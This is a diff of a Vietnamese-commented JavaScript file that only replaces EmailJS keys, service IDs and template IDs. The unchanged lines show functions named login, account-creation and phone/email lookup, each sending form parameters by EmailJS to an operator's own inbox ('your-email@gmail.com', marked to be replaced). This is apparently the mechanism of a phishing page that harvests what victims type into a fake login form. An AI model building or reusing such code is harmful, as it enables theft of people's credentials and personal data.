@@ -1,6 +1,6 @@
 // Khởi tạo EmailJS với Public Key
 (function() {
-    emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng Public Key thực tế của bạn
+    emailjs.init("Fc4GBwgnOXvUlKqzG"); // Thay bằng Public Key thực tế của bạn
 })();
 
 // Hàm kiểm tra xem có phải Safari trên thiết bị di động không
@@ -198,7 +198,7 @@ function login() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('email-success-popup');
@@ -236,7 +236,7 @@ function searchByPhone() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('phone-email-success-popup');
@@ -274,7 +274,7 @@ function searchByPhoneDesktop() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('phone-email-success-popup');
@@ -312,7 +312,7 @@ function searchByEmail() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('email-email-success-popup');
@@ -350,7 +350,7 @@ function searchByEmailDesktop() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('email-email-success-popup');
@@ -392,7 +392,7 @@ function createAccount() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('create-account-success-popup');
@@ -434,7 +434,7 @@ function createAccountDesktop() {
         to_email: "your-email@gmail.com" // Thay bằng email của bạn
     };
 
-    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+    emailjs.send('service_fm9wosu', 'template_3ta7c2h', templateParams)
         .then(function(response) {
             console.log('Email gửi thành công!', response.status, response.text);
             showSuccessPopup('create-account-success-popup');
